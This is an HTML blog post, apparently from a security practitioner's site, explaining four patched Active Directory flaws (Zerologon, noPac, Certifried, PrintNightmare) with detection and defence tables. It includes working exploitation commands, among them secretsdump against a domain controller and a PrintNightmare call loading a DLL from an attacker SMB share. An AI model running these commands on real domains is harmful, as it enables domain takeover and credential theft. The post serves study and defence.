@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Fast-Path CVEs: Zerologon, noPac, Certifried & PrintNightmare — Satej Chaudhari</title>
+  <meta name="description" content="Four Active Directory vulnerabilities that collapse the attack path from a low-privileged position to Domain Admin or SYSTEM — how Zerologon, noPac (sAMAccountName spoofing), Certifried and PrintNightmare each work, and how to detect and defend them.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script>
+  (function(){
+    try{var t=localStorage.getItem('theme');if(t==='light'||t==='dark')document.documentElement.setAttribute('data-theme',t);}catch(e){}
+    document.addEventListener('DOMContentLoaded',function(){
+      var b=document.querySelector('.theme-toggle');
+      if(b)b.addEventListener('click',function(){
+        var d=document.documentElement,c=d.getAttribute('data-theme')||'dark',n=c==='dark'?'light':'dark';
+        d.setAttribute('data-theme',n);try{localStorage.setItem('theme',n);}catch(e){}
+      });
+      var nt=document.querySelector('.nav-toggle'),nv=document.querySelector('.site-nav');
+      if(nt&&nv&&!nt.dataset.bound){nt.dataset.bound='1';nt.addEventListener('click',function(){var o=nv.classList.toggle('open');nt.setAttribute('aria-expanded',o?'true':'false');});}
+    });
+  })();
+  </script>
+</head>
+<body>
+
+  <header class="site-header">
+    <div class="wrap-wide">
+      <a class="brand" href="../index.html">
+        <span class="brand-mark">SC</span>
+        <span class="brand-name">Satej Chaudhari</span>
+      </a>
+      <nav class="site-nav">
+        <a href="../index.html">Home</a>
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="https://github.com/satejchaudhari" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+      </nav>
+      <button class="theme-toggle" aria-label="Toggle light and dark theme" title="Toggle theme">
+        <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <main class="wrap post">
+    <a class="post-back" href="../theory.html">&larr; back to theory</a>
+
+    <article>
+      <header class="post-header">
+        <span class="tag">AD</span>
+        <h1 class="post-title">Fast-Path CVEs: Zerologon, noPac, Certifried & PrintNightmare</h1>
+        <p class="post-meta">
+          <time datetime="2026-09-24">2026-09-24</time>
+          <span>&middot; 16 min read</span>
+        </p>
+      </header>
+
+      <div class="post-body">
+
+        <p>
+          Most of the <a href="../ad-map.html">Attack-Path map</a> is a patient chain of small
+          escalations. A handful of vulnerabilities skip the chain entirely — from network access or a
+          plain domain user, straight to Domain Admin or SYSTEM. They are worth studying together
+          because they share a lesson: each abuses a place where Active Directory <em>trusted an
+          identity it should have verified</em>. All four are patched in current builds, so this is a
+          "know it when you see an unpatched estate" page, not a green light.
+        </p>
+
+        <blockquote>
+          A quick word on responsibility: several of these (Zerologon especially) can damage a domain
+          if run carelessly. Only ever use them against systems you are explicitly authorised to test,
+          and follow the restore steps where they exist. See the
+          <a href="../disclaimer.html">disclaimer</a>.
+        </blockquote>
+
+        <h2>Zerologon — CVE-2020-1472</h2>
+        <p>
+          Zerologon is a cryptographic flaw in the <strong>Netlogon</strong> secure channel — the
+          protocol a domain-joined machine uses to authenticate to a DC. The session key was derived
+          using AES in <strong>CFB8 mode with a fixed, all-zero initialisation vector</strong>. With a
+          zero IV, roughly one in 256 randomly chosen keys produces an all-zero ciphertext, so an
+          attacker who simply retries the authentication handshake with a zero client-challenge will,
+          after a few hundred attempts, be accepted <em>without knowing the machine's password</em>.
+        </p>
+        <p>
+          Once the channel is established, the same weakness lets the attacker call
+          <code>NetrServerPasswordSet2</code> to set the target computer account's password to
+          <strong>empty</strong> in Active Directory. Point that at a domain controller's own machine
+          account and you can then authenticate as the DC and <a href="2026-08-18-dcsync.html">DCSync</a>
+          the entire domain:
+        </p>
+        <pre><code>nxc smb &lt;dc_ip&gt; -M zerologon                                   # test
+# exploit sets DC$ password to empty, then:
+secretsdump.py -no-pass &lt;domain&gt;/'&lt;DC_NETBIOS&gt;$'@&lt;dc_ip&gt; -just-dc-user Administrator</code></pre>
+        <p>
+          The catch — and the danger — is that you have now desynchronised the DC's password between
+          AD and its local <code>LSASS</code>/registry, which can break the domain. Responsible use
+          <em>restores</em> the original password afterward (the exploit records the original hash for
+          exactly this). This is the most destructive item on the page; treat it accordingly.
+        </p>
+        <table>
+          <thead><tr><th>Fact</th><th>Detail</th></tr></thead>
+          <tbody>
+            <tr><td>Precondition</td><td>Network access to an unpatched DC (pre-Aug-2020)</td></tr>
+            <tr><td>Result</td><td>DC machine-account takeover → DCSync → Domain Admin</td></tr>
+            <tr><td>Detection</td><td>Netlogon events with zeroed challenges; a DC machine-account password change over Netlogon (4742) is a red flag</td></tr>
+          </tbody>
+        </table>
+
+        <h2>noPac / sAMAccountName spoofing — CVE-2021-42278 &amp; CVE-2021-42287</h2>
+        <p>
+          "noPac" chains two bugs in how Kerberos resolves account names. Normally computer accounts
+          end in a <code>$</code> (<code>DC01$</code>). CVE-2021-42278 was a <em>validation</em> gap:
+          the directory did not enforce that a machine account's <code>sAMAccountName</code> end in
+          <code>$</code>. CVE-2021-42287 was a <em>lookup</em> gap: when a service ticket is requested
+          for a principal the KDC cannot find, it retries by appending <code>$</code> — so if you name
+          your machine after a DC (without the dollar), the KDC can end up mapping your ticket to the
+          real DC account.
+        </p>
+        <p>The chain, using nothing but a normal domain user:</p>
+        <ol>
+          <li>Create a computer account (the default <code>MachineAccountQuota</code> of 10 allows it).</li>
+          <li>Rename its <code>sAMAccountName</code> to a DC's name <em>without</em> the trailing
+              <code>$</code> (e.g. <code>DC01</code>).</li>
+          <li>Request a TGT for that name, then drop/restore the name so the KDC can no longer find it.</li>
+          <li>Request a service ticket (S4U2self) — the KDC falls back and issues a ticket as
+              <code>DC01$</code>, i.e. as the domain controller, with a privileged PAC.</li>
+        </ol>
+        <pre><code>noPac.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;dc_ip&gt; --impersonate administrator -dump
+# goldenPac.py automates the classic MS14-068-style variant end-to-end</code></pre>
+        <table>
+          <thead><tr><th>Fact</th><th>Detail</th></tr></thead>
+          <tbody>
+            <tr><td>Precondition</td><td>A domain user + <code>MachineAccountQuota</code> &gt; 0 against an unpatched DC</td></tr>
+            <tr><td>Result</td><td>A ticket as a domain controller → Domain Admin</td></tr>
+            <tr><td>Detection</td><td>A machine account renamed to a DC name; 4741/4742 (computer created/changed) then TGS anomalies (4769) with mismatched names</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Certifried — CVE-2022-26923</h2>
+        <p>
+          Certifried is the <a href="2026-08-18-adcs.html">AD CS</a> cousin of the above. When a
+          computer enrolls for a certificate (e.g. the default <em>Machine</em> template), the
+          certificate's identity is tied to the account's <code>dNSHostName</code>. Before the patch,
+          a user who could create or control a machine account could set that machine's
+          <code>dNSHostName</code> to <em>match a domain controller's</em>. Enrolling then yielded a
+          certificate that authenticates <strong>as the DC</strong>, and PKINIT with it (see
+          <a href="2026-09-24-shadow-credentials-pkinit.html">Shadow Credentials / PKINIT</a>) produces
+          a DC ticket:
+        </p>
+        <pre><code>certipy account create -u &lt;user&gt;@&lt;domain&gt; -p '&lt;pass&gt;' -user 'certipc' -dns '&lt;dc_fqdn&gt;'
+certipy req -u 'certipc$'@&lt;domain&gt; -p '&lt;pass&gt;' -ca &lt;ca_name&gt; -template Machine
+certipy auth -pfx certipc.pfx -dc-ip &lt;dc_ip&gt;        # authenticate as the DC</code></pre>
+        <p>
+          It is the same underlying sin as noPac — a spoofable identity attribute (here
+          <code>dNSHostName</code> instead of <code>sAMAccountName</code>) — expressed through
+          certificates. The fix adds the account's SID as a hardened extension so the impersonation no
+          longer maps.
+        </p>
+        <table>
+          <thead><tr><th>Fact</th><th>Detail</th></tr></thead>
+          <tbody>
+            <tr><td>Precondition</td><td><code>MachineAccountQuota</code> &gt; 0 and an AD CS with a client-auth machine template (pre-patch)</td></tr>
+            <tr><td>Result</td><td>A certificate/ticket as a DC → Domain Admin</td></tr>
+            <tr><td>Detection</td><td>A computer whose <code>dNSHostName</code> collides with a DC; certificate issuance to a freshly created machine</td></tr>
+          </tbody>
+        </table>
+
+        <h2>PrintNightmare — CVE-2021-1675 / CVE-2021-34527</h2>
+        <p>
+          PrintNightmare is a flaw in the Windows <strong>Print Spooler</strong>. The
+          <code>RpcAddPrinterDriver</code> family of calls lets a client install a printer driver — and
+          the spooler loads the driver DLL as <code>SYSTEM</code>. The bug let an authenticated,
+          low-privileged user point that installation at an attacker-supplied DLL (locally, or from a
+          remote SMB share), giving <strong>SYSTEM code execution</strong>. Because the Spooler service
+          runs on domain controllers by default, a remote variant meant SYSTEM <em>on a DC</em>:
+        </p>
+        <pre><code>CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;target&gt; '\\&lt;attacker&gt;\share\evil.dll'</code></pre>
+        <p>
+          It doubles as a local privilege escalation (any user → SYSTEM) and a lateral-movement /
+          DC-compromise primitive. The related "point and print" registry weaknesses kept the surface
+          alive well past the first patches, so it is a recurring find on estates that only applied
+          part of the mitigation.
+        </p>
+        <table>
+          <thead><tr><th>Fact</th><th>Detail</th></tr></thead>
+          <tbody>
+            <tr><td>Precondition</td><td>Spooler service running (often on DCs) + a driver path (local or remote)</td></tr>
+            <tr><td>Result</td><td>SYSTEM locally, or SYSTEM on a remote spooler (incl. DCs)</td></tr>
+            <tr><td>Detection</td><td>Spooler loading a DLL from a user-writable or remote path; new printer drivers; 4688 under <code>spoolsv.exe</code></td></tr>
+          </tbody>
+        </table>
+
+        <h2>Honourable mentions</h2>
+        <p>
+          Two more "fast paths" you will meet on the map: <strong>MS14-068</strong> forged a Kerberos
+          PAC to claim privileged group membership on very old, unpatched DCs (goldenPac); and
+          <strong>PetitPotam + ESC8</strong> coerces a DC to authenticate and relays it to AD CS web
+          enrollment for a DC certificate — not a single CVE but a devastating chain covered under
+          <a href="2026-08-18-coercion-ntlm-relay.html">Coercion &amp; Relay</a> and
+          <a href="2026-08-18-adcs.html">AD CS</a>.
+        </p>
+
+        <h2>Cross-cutting detection &amp; defence</h2>
+        <table>
+          <thead><tr><th>Control</th><th>Effect</th></tr></thead>
+          <tbody>
+            <tr><td>Patch — and verify the <em>full</em> fix (Netlogon enforcement, Point-and-Print, AD CS SID extension KB5014754)</td><td>Each of these had partial or bypassable initial patches; currency is necessary but check the hardening too</td></tr>
+            <tr><td>Set <code>ms-DS-MachineAccountQuota</code> to 0</td><td>Removes the "create a computer" precondition behind noPac and Certifried</td></tr>
+            <tr><td>Disable the Print Spooler on domain controllers and servers that do not print</td><td>Closes PrintNightmare and the PrinterBug coercion vector</td></tr>
+            <tr><td>Enforce Netlogon secure-channel signing/sealing</td><td>Directly mitigates Zerologon</td></tr>
+            <tr><td>Monitor machine-account creation/rename and <code>dNSHostName</code> collisions with DCs</td><td>High-fidelity signal for noPac and Certifried</td></tr>
+            <tr><td>Rotate <code>krbtgt</code> and reset the DC machine password after any suspected DC compromise</td><td>Invalidates tickets/positions gained through these paths</td></tr>
+          </tbody>
+        </table>
+
+        <h2>The takeaway</h2>
+        <p>
+          These four collapse the attack path because they each let a weak identity stand in for a
+          strong one — a zero IV impersonating a machine (Zerologon), a name without a dollar sign
+          impersonating a DC (noPac), a spoofed DNS name impersonating a DC in a certificate
+          (Certifried), or a low-privileged driver install acting as SYSTEM (PrintNightmare). They are
+          patched, but unpatched pockets persist, so recognising the preconditions — an old DC,
+          <code>MachineAccountQuota</code> &gt; 0, a spooler on a DC, an AD CS with default templates —
+          is the practical skill. Zerologon in particular can break a domain: authorised testing and
+          restore steps only. The exploitation commands live under the relevant entries in
+          <a href="../vulns.html">Vulns &amp; Misconfigs</a>, and every one of these feeds back into
+          <a href="2026-08-18-dcsync.html">DCSync</a> and <a href="2026-08-18-ticket-attacks.html">ticket
+          attacks</a> for durable control.
+        </p>
+        
+      </div>
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <div class="wrap-wide">
+      <p>&copy; 2026 Satej Chaudhari</p>
+      <div class="footer-links">
+        <a href="../writeups.html">Writeups</a>
+        <a href="../blog.html">Blog</a>
+        <a href="../theory.html">Theory</a>
+        <a href="../toolkit.html">Toolkit</a>
+        <a href="../vulns.html">Vulns &amp; Misconfigs</a>
+        <a href="../disclaimer.html">Disclaimer</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js"></script>
+</body>
+</html>
